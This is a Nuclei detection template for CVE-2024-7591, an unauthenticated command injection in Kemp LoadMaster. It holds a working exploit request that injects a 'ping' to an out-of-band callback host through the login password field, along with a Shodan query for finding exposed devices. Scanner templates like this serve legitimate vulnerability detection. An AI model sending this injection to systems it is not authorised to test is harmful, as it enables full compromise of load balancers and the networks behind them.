http:
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - value="(.*?)" name="token"
    type: regex
  - group: 1
    internal: true
    name: token2
    part: body
    regex:
    - value="(.*?)" name="token2"
    type: regex
  raw:
  - 'GET /progs/homepage HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, 'dns')
    - contains_all(body, "alert(\"Login Failed\");", "2 packets transmitted")
    type: dsl
  raw:
  - 'POST /progs/status/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    token={{token}}&token2={{token2}}&user=test&logsub=Login&pass=%01%78%78%78%78%78%78%78%27%3b%70%69%6e%67%20%2d%63%20%32%20{{payload}}%3b%65%63%68%6f%20%27%01&

    '
id: CVE-2024-7591
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:kemptechnologies:loadmaster:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-7591
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-78
    epss-percentile: 0.96637
    epss-score: 0.31849
  description: 'Improper Input Validation vulnerability in Progress LoadMaster allows
    OS Command Injection.This issue affects: LoadMaster: 7.2.40.0 and above. ECS:
    All versions.Multi-Tenancy: 7.1.35.4 and above.

    '
  impact: 'Unauthenticated attackers can execute arbitrary OS commands on the LoadMaster
    load balancer through command injection, achieving complete system compromise
    with potential to pivot to backend infrastructure.

    '
  metadata:
    max-request: 2
    product: loadmaster
    shodan-query: html:"Kemp Login Screen"
    vendor: kemptechnologies
    verified: true
  name: Kemp LoadMaster Load Balancer - Unauthenticated Command Injection
  reference:
  - https://insinuator.net/2024/11/vulnerability-disclosure-command-injection-in-kemp-loadmaster-load-balancer-cve-2024-7591/
  - https://nvd.nist.gov/vuln/detail/cve-2024-7591
  - https://support.kemptechnologies.com/hc/en-us/articles/29196371689613-LoadMaster-Security-Vulnerability-CVE-2024-7591
  - https://insinuator.net/2024/11/vulnerability-disclosure-command-injection-in-kemp-loadmaster-load-balancer-cve-2024-7591
  remediation: 'Apply security updates from Kemp Technologies as specified in their
    security advisory for LoadMaster versions 7.2.40.0 and above, ECS all versions,
    and Multi-Tenancy 7.1.35.4 and above.

    '
  severity: critical
  tags: cve,cve2024,loadmaster,rce,oast,kemptechnologies,vuln
variables:
  oast: .{{interactsh-url}}
  payload: '{{padding(oast,''a'',50,''prefix'')}}'
